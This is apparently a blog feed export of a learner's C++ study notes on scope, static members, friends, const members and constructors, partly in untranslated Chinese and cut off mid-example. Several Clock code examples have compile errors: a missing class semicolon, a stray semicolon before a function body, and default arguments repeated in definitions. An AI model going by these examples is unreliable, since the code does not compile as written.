RelatedSupplements</h1><p>References are commonly used for function parameter lists andfunction return values. Below are two important concepts related to C++references that C++ programmers must understand:</p><p><ahref="https://www.runoob.com/cplusplus/passing-parameters-by-references.html">UsingReferences as Parameters</a></p><p><ahref="https://www.runoob.com/cplusplus/returning-values-by-reference.html">UsingReferences as Return Values</a></p><h1 id="deep-copy-vs-shallow-copy">Deep Copy vs Shallow Copy</h1><p>The implicit copy constructor only implements shallow copy, but suchcopying is not suitable for all situations.</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/浅复制/main.cpp">ShallowCopy Code Example</a></p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/深复制/main.cpp">DeepCopy Code Example</a></p><h1 id="strings">Strings</h1><p>C++ has encapsulated a series of complex string operations, formingthe string class for more convenient string manipulation.</p><div class="note info flat"><p>Many string operations require the assistance of <strong>stringprocessing functions</strong> in the <strong>cstring</strong> headerfile. Using the string class requires including the<strong>string</strong> header file.</p></div><p><a href="https://www.runoob.com/cplusplus/cpp-strings.html">StringRelated Explanation</a></p><h1 id="personal-bank-account-management-program">Personal Bank AccountManagement Program</h1><p>Functional supplement to the previous management program.</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update">Sourcecode on github</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Data Sharing and Protection</title>
      <link href="/2022/07/21/CPP/C++%20Data%20Sharing%20and%20Protection/"/>
      <url>/2022/07/21/CPP/C++%20Data%20Sharing%20and%20Protection/</url>
      
        <content type="html"><![CDATA[<h1 id="identifier-scope-and-visibility">Identifier Scope andVisibility</h1><h2 id="scope">Scope</h2><p>Scope is the <strong>valid region</strong> where an identifier iseffective in the program text.</p><h3 id="function-prototype-scope">Function Prototype Scope</h3><p>The scope of formal parameters during function prototype declarationis the function prototype scope.</p><div class="note info flat"><p>In function prototype parameter lists, only the type matters, not theidentifier, which can be omitted. For readability, it’s better toinclude it.</p></div><h3 id="local-scope">Local Scope</h3><p>Simply understood as variables declared <strong>within functionbodies</strong>, from the declaration point to the closing brace of theblock where the declaration is located.</p><blockquote><p>Variables with local scope are also called local variables.</p></blockquote><h3 id="class-scope">Class Scope</h3><p>A class is a collection of named members, and its member m has classscope. There are three ways to access it:</p><ol type="1"><li>If member m is not defined in the member function and is not maskedby the function body, the function can directly access m;</li><li>Through expressions <code>x.m</code> or <code>X::m</code>.<strong>This is the most basic method</strong>, with the latter mainlyused to access static members of the class.</li><li>Through <code>ptr-&gt;m</code> access, where ptr is a<strong>pointer</strong> to an object of that class.</li></ol><h3 id="namespace-scope">Namespace Scope</h3><p>The purpose of namespaces is to eliminate ambiguity that may exist indifferent files in a project, for example: when variables in twodifferent modules have the same name.</p><p>The syntax is as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> namespace_name&#123;</span><br><span class="line">  <span class="function">Various declarations within the <span class="title">namespace</span> <span class="params">(function declarations, <span class="keyword">class</span> declarations, ...)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>Within the namespace, identifiers defined in the current space can beused directly. If you need to use identifiers defined in othernamespaces, you need to use <code>namespace_name::identifier</code>. Toavoid verbosity, using statements are provided.</p><p>There are two forms of using statements:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> namespace_name::identifier</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> namespace_name</span><br></pre></td></tr></table></figure><p>Two special types of namespaces—global namespace and anonymousnamespace.</p><p>The global namespace is the default namespace, and identifiersdeclared outside explicitly declared namespaces are all in a globalnamespace.</p><p>Anonymous namespace only needs to omit the namespace name whendefining, and its purpose is to prevent identifiers you define frombeing accessed by any other namespace.</p><blockquote><p>All identifiers in the C++ standard library are declared in the stdnamespace, cout, cin, endl are all like this, so every program uses<code>using namespace std</code>, otherwise you need to use<code>std::cin</code>…</p></blockquote><p>Additionally, namespaces <strong>allow nesting</strong>.</p><div class="note info flat"><p>Variables with namespace scope are also called global variables.</p></div><hr /><h2 id="visibility">Visibility</h2><p>The content is relatively simple and straightforward, so it’somitted.</p><hr /><h1 id="object-lifetime">Object Lifetime</h1><h2 id="static-lifetime">Static Lifetime</h2><p>Objects whose lifetime is the same as the program’s runtime are saidto have static lifetime, and the keyword <strong>static</strong> needsto be used when declaring.</p><p>Characteristics: A copy is not created with each function call, nordoes it become invalid when the function returns. Variables are sharedduring each call period. Assignment is performed only once, and theassignment statement at declaration is not executed multiple times.</p><div class="note info flat"><p>If not initialized at declaration, it defaults to 0.</p></div><h2 id="dynamic-lifetime">Dynamic Lifetime</h2><p>Local lifetime objects are born at the declaration point and end whenthe block where the declaration is located finishes execution.</p><h1 id="class-static-members">Class Static Members</h1><p>Objects also need to share data with each other, and static memberssolve this problem.</p><p>For example, if there’s an Employee class, we have several Employeeobjects, but how do we count how many Employee objects there are? Thisis when static data members can be used, as this data member is sharedby all objects.</p><h2 id="static-data-members">Static Data Members</h2><p>When a certain attribute is <strong>shared by the entireclass</strong> and <strong>does not belong to any specificobject</strong>, the <strong>static</strong> keyword is used to declareit as a static member. There is only one copy in the entire class,maintained and used by all objects.</p><p>Because it doesn’t belong to any object and has static lifetime, itis accessed through the class name.“<strong>class_name::identifier</strong>”.</p><div class="note warning flat"><p>In the class definition, only a reference declaration is made. Adefinition declaration must be made somewhere in the namespace scopeusing the class name qualifier, where initialization can also beperformed.</p></div><p>Program example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;                                        <span class="comment">//Point class definition public: //external interface</span></span><br><span class="line"><span class="built_in">Point</span>(<span class="type">int</span> x = <span class="number">0</span>, <span class="type">int</span> y = <span class="number">0</span>) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y)&#123;          <span class="comment">//constructor                                                                                            </span></span><br><span class="line">  count++;            <span class="comment">//increment count in constructor, all objects maintain the same count </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">Point</span>(Point &amp;p)&#123;      <span class="comment">//copy constructor</span></span><br><span class="line">x = p.x;</span><br><span class="line">y = p.y;</span><br><span class="line">count++;</span><br><span class="line">&#125; </span><br><span class="line">~<span class="built_in">Point</span>() &#123; count--; &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showCount</span><span class="params">()</span> </span>&#123; <span class="comment">//output static data member </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot; Object count = &quot;</span> &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">  &#125; </span><br><span class="line"><span class="keyword">private</span>:             <span class="comment">//private data members </span></span><br><span class="line">  <span class="type">int</span> x, y; </span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> count;  <span class="comment">//static data member declaration, used to record the number of points </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Point::count = <span class="number">0</span>;<span class="comment">//static data member definition and initialization, using class name qualifier </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;         <span class="comment">//main function </span></span><br><span class="line">  <span class="function">Point <span class="title">a</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>)</span></span>;     <span class="comment">//define object a, its constructor will increment count by 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point A: &quot;</span> &lt;&lt; a.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; a.<span class="built_in">getY</span>(); a.<span class="built_in">showCount</span>(); <span class="comment">//output object count</span></span><br><span class="line"><span class="function">Point <span class="title">b</span><span class="params">(a)</span></span>;        <span class="comment">//define object b, its constructor will increment count by 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point B: &quot;</span> &lt;&lt; b.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; b.<span class="built_in">getY</span>(); b.<span class="built_in">showCount</span>(); <span class="comment">//output object count </span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="static-member-functions">Static Member Functions</h2><p>There’s actually a problem in the above program: the showcountfunction requires the existence of a Point object to be called, but whatif I want to directly output the value of count? This is when staticmember functions are needed, allowing direct function calls through theclass name without depending on objects.</p><div class="note success flat"><p>Although static member functions can also be accessed using objects,it’s generally customary to access them through the class name. Evenwhen accessed through an object name, the function has no relationshipwith the object.</p></div><h1 id="class-friends">Class Friends</h1><p>Using the Point class as an example, what if we need a function tocalculate the distance between two points?</p><p>Setting it as an ordinary function outside the class doesn’t reflectthe connection between the function and points, and can’t directly usepoint coordinates;</p><p>Setting it as a member function inside the class doesn’t conform tothe abstraction that a class represents the characteristics of a type ofthing, because distance represents the relationship between points, notthe characteristics of a point.</p><blockquote><p>In <ahref="https://hustlixiang21.github.io/2022/07/20/CPP类和对象/">classcomposition</a>, there’s a Point and Line class, and the Line class hasa function to calculate line segment length. But if we’re facing manypoints and frequently need to calculate distances between any twopoints, do we need to construct a Line class every time? This isobviously very troublesome.</p></blockquote><p>Friend relationships provide a mechanism for data sharing betweenmember functions of different classes or objects, and between classmember functions and general functions.</p><p>In a class, the keyword <strong>friend</strong> is used to declarefunctions as friend functions and classes as friend classes. <strong>Allfunctions of a friend class are friend functions</strong>.</p><h2 id="friend-functions">Friend Functions</h2><p>These are <strong>non-member functions</strong> modified with thekeyword <strong>friend</strong> in a class. They can be ordinaryfunctions or member functions of other classes. In the function body offriend functions, private and protected members of the class can beaccessed through object names.</p><p>There’s <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/Point_distance(friend)/main.cpp">practicesource code</a> on github.</p><h2 id="friend-classes">Friend Classes</h2><p>Similar to friend functions. If class A is a friend class of class B,then all member functions of class A are friend functions of class B andcan access private and protected members of class B.</p><p>Special attention ⚠️:</p><ul><li>Friend relationships are <strong>not transitive</strong>. If B is afriend of A and C is a friend of B, C is <strong>not a friend ofA</strong> without explicit declaration.</li><li>Friend relationships are <strong>unidirectional</strong>. If B is afriend of A, B can access A, but A cannot access B.</li><li>Friend relationships are <strong>not inherited</strong>. If B is afriend of A, B’s derived classes do not automatically become friends ofA. A simple analogy is: if someone trusts your father, they don’tnecessarily trust you.</li></ul><h1 id="shared-data-protection">Shared Data Protection</h1><h2 id="constant-objects">Constant Objects</h2><p>The data value members of constant objects cannot be changed duringthe entire lifetime of the object. <strong><u>Constant objects must beinitialized and cannot be updated.</u></strong></p><div class="note warning flat"><p>Specifying initial values at definition is called initialization, andsubsequent changes through assignment operations are called assignment.<strong>Don’t confuse initialization with assignment</strong>!</p></div><h2 id="class-members-modified-with-const">Class Members Modified withconst</h2><h3 id="constant-member-functions">Constant Member Functions</h3><p>Declaration format:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">type_specifier <span class="title">function_name</span><span class="params">(parameter_list)</span> <span class="type">const</span></span>;</span><br></pre></td></tr></table></figure><p>Note ⚠️:</p><ul><li>If an object is a constant object, only constant member functionscan be called through that constant object, <strong>other memberfunctions cannot be called</strong>! This is C++’s protection forconstant objects and is the <strong>only external interfacemethod</strong> for constant objects.</li><li>Whether called through a constant object or not, during the call ofa constant member function, the target object is treated as a constantobject. Therefore, constant member functions cannot update the datamembers of the target object, nor can they call member functions of thatclass that are not modified with const for the target object (ensuringthat constant member functions do not modify the data member values ofthe target object).</li><li>The const keyword can be used to distinguish overloaded functions(functions with the same name but with or without const are differentfunctions).</li></ul><h3 id="constant-data-members">Constant Data Members</h3><p>Data members declared with const are constant data members, and nofunction can assign values to them. Constructors can only obtain initialvalues through initialization lists for these data members.</p><div class="note info flat"><p>Static variables and constants in class members should be definedoutside the class definition, but C++ provides an exception: if aclass’s static constant has integer type or enumeration type, theconstant value can be directly specified in the class definition.</p></div><h3 id="constant-references">Constant References</h3><p>If a reference is modified with const when declared, the declaredreference is a constant reference, and the object referenced by theconstant reference cannot be updated. When used as function parameters,it prevents accidental changes to actual parameters.</p><blockquote><p>For parameters whose values cannot be changed in functions, it’s notsuitable to use ordinary reference passing, as it would prevent<strong>constant objects from being passed in</strong>. Usingpass-by-value or passing constant references can avoid this problem.Pass-by-value is more time-consuming, so passing constant references isbetter. Copy constructor parameters generally also choose constantreferences!</p></blockquote><h1id="multi-file-structure-and-compilation-preprocessing-commands">Multi-fileStructure and Compilation Preprocessing Commands</h1><p>Since there’s a foundation in C language, this section only listssome unfamiliar and less memorable content.</p><h2 id="general-organization-structure-of-c-programs">GeneralOrganization Structure of C++ Programs</h2><p>A project can be divided into multiple source files:</p><ul><li>Class declaration files (.h files)</li><li>Class implementation files (.cpp files)</li><li>Class usage files (.cpp files containing main())</li></ul><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-22%2000.16.36.png" /></p><h2 id="standard-c-library">Standard C++ Library</h2><p>The standard C++ class library is a collection of extremely flexibleand extensible reusable software modules.</p><p>Standard C++ classes and components are logically divided into 6types:</p><ul><li>Input/Output classes<br /></li><li>Container classes and abstract data types</li><li>Storage management classes</li><li>Algorithms</li><li>Error handling</li><li>Runtime environment support</li></ul><h1id="comprehensive-examplepersonal-bank-account-management-program">ComprehensiveExample—Personal Bank Account Management Program</h1><p>The program source code has been uploaded to <ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management">github</a>and compiled using <ahref="https://hustlixiang21.github.io/2022/06/19/Makefile入门/">makefile</a>.</p><div class="note danger flat"><p>Serious error: static variables were not assigned initial valuesexternally, causing my progress to stagnate for two hours, and theinitialization assignment was done in the file where the class memberfunctions are defined.</p></div>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Classes and Objects</title>
      <link href="/2022/07/20/CPP/C++%20Classes%20and%20Objects/"/>
      <url>/2022/07/20/CPP/C++%20Classes%20and%20Objects/</url>
      
        <content type="html"><![CDATA[<h1 id="classes-and-objects">Classes and Objects</h1><h2 id="basic-characteristics-of-object-oriented-programming">BasicCharacteristics of Object-Oriented Programming</h2><p><strong>Abstraction</strong></p><ul><li>Summarize the common attributes and behaviors of objects of the sameclass to form a class.<ul><li>First focus on the essence and description of the problem, then theimplementation process or details.</li><li>Data abstraction: Describe the attributes or state of objects of acertain class (physical quantities that distinguish objects from eachother).</li><li>Code abstraction: Describe the common behavioral characteristics orfunctions that objects of a certain class have.</li><li>Implementation of abstraction: class.</li></ul></li><li>Abstraction example—Clock<ul><li>Data abstraction: int hour,int minute,int second</li><li>Code abstraction: setTime(),showTime()</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">   <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr /><p><strong>Encapsulation</strong></p><ul><li>Encapsulate the abstracted data and code together to form a class.<ul><li>Purpose: Enhance security and simplify programming. Users don’t needto understand specific implementation details, but only need to useclass members through external interfaces with specific accesspermissions.</li><li>Implementation of encapsulation: {} in class declaration</li></ul></li><li>Example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>: <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">          <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>: <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr /><p><strong>Inheritance</strong></p><ul><li>Extend on the basis of existing classes to form new classes.</li></ul><hr /><p><strong>Polymorphism</strong></p><ul><li>Polymorphism: Same name, different functional implementations.</li><li>Purpose: Achieve unified behavioral identification and reduce thenumber of identifiers in the program.</li></ul><hr /><h2 id="definition-of-classes-and-objects">Definition of Classes andObjects</h2><h3 id="syntax-form-of-class-definition">Syntax Form of ClassDefinition</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">class_name</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="title">members</span> <span class="params">(external interface)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">private</span>:</span></span><br><span class="line"><span class="function">                private members</span></span><br><span class="line"><span class="function">    protected:</span></span><br><span class="line"><span class="function">                protected members</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><hr /><h3 id="in-class-initial-values">In-class Initial Values</h3><ul><li>Can provide an in-class initial value for data members</li><li>When creating objects, in-class initial values are used toinitialize data members</li><li>Members without initial values will be default initialized</li></ul><hr /><h3 id="class-member-access-control">Class Member Access Control</h3><ul><li>Public type members<ul><li>Declared after the keyword public, they are the interface betweenthe class and the outside, any external function can access public typedata and functions</li></ul></li><li>Private type members<ul><li>Declared after the keyword private, only functions in this class canaccess them, and no external function can access them.</li><li>If private members are declared immediately after the class name,the keyword <strong>private</strong> can be omitted</li></ul></li><li>Protected type members<ul><li>Similar to private, the difference is manifested in the differenteffects on derived classes during inheritance and derivation</li></ul></li></ul><hr /><h3 id="class-member-functions">Class Member Functions</h3><ul><li>Declare function prototypes in the class</li><li>Can provide function body implementation outside the class, andqualify with class name before the function name</li><li>Can also directly provide function body in the class, forming inlinemember functions</li><li>Allow declaration of overloaded functions and functions with defaultparameter values</li></ul><hr /><h3 id="class-and-object-program-example">Class and Object ProgramExample</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//class definition</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//member function implementation</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//object usage</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Clock myClock;</span><br><span class="line">    myClock.<span class="built_in">setTime</span>(<span class="number">8</span>,<span class="number">30</span>,<span class="number">30</span>);</span><br><span class="line">    myClock.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><h2 id="constructors-and-destructors">Constructors and Destructors</h2><h3 id="constructors">Constructors</h3><h4 id="purpose-of-constructors">Purpose of Constructors</h4><p>Use specific values to construct objects when they are created,<strong>initializing</strong> the object to a specific initialstate.</p><blockquote><p>When hoping to construct a Clock class object and set the initialtime to 0:0:0, this can be set through a constructor.</p></blockquote><hr /><h4 id="form-of-constructors">Form of Constructors</h4><ul><li>Function name is the same as class name</li><li>Cannot define return type, and cannot have return statements</li><li>Can have formal parameters or no formal parameters</li><li>Can be inline functions</li><li>Can be overloaded</li><li>Can have default parameter values</li></ul><hr /><h4 id="timing-of-constructor-calls">Timing of Constructor Calls</h4><p>Automatically called when objects are created</p><hr /><h4 id="constructor-example">Constructor Example</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//class definition</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS);<span class="comment">//constructor</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;;<span class="comment">//there&#x27;s a semicolon here</span></span><br><span class="line"><span class="comment">//constructor implementation</span></span><br><span class="line">Clock::<span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS): <span class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="comment">//member function implementation</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//object usage</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Clock <span class="title">c</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span>;<span class="comment">//automatically call constructor</span></span><br><span class="line">    c.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><blockquote><p>The :: symbol is the scope resolution operator, which means functiondefinitions need to use class_name:: to qualify member functions.</p></blockquote><div class="note warning flat"><p>A very important thing is that there’s a semicolon after the classdefinition ends!!! (wasted a lot of time)</p></div><hr /><h4 id="default-constructor">Default Constructor</h4><ul><li>Constructor that can be called without actual parameters<ul><li>Constructor with empty parameter list</li><li>Constructor where all parameters have default values</li></ul></li><li>The following two are both <strong>default constructors</strong>. Ifthey appear simultaneously in a class, a compilation error willoccur:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>();</span><br><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH=<span class="number">0</span>,<span class="type">int</span> newM=<span class="number">0</span>,<span class="type">int</span> newS=<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Both functions require no initial values, so there will be a call conflict</span></span><br></pre></td></tr></table></figure><hr /><h4 id="隐含生成的构造函数">隐含生成的构造函数</h4><p>如果程序中未定义构造函数，编译器将在需要时自动生成一个<strong>默认构造函数</strong></p><ul><li>参数列表为空，不为数据成员设计初始值</li><li>如果类内定义了成员的初始值，则使用类内定义的初始值</li><li>如果没有定义类内的初始值，则以默认方式初始化</li><li>基本类型的数据默认初始化的值是不确定的</li></ul><hr /><h4 id="default">“=default”</h4><p>如果类内已定义构造函数，默认情况下编译器不再隐含生成默认构造函数。如果你坚持希望隐含生成默认构造函数，用“=default”</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>() = <span class="keyword">default</span>;<span class="comment">//指示编译器提供默认构造函数</span></span><br></pre></td></tr></table></figure><hr /><h4 id="委托构造函数">委托构造函数</h4><p>委托构造函数（delegatingconstructor）使用类其他构造函数执行初始化过程</p><p>例如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS):<span 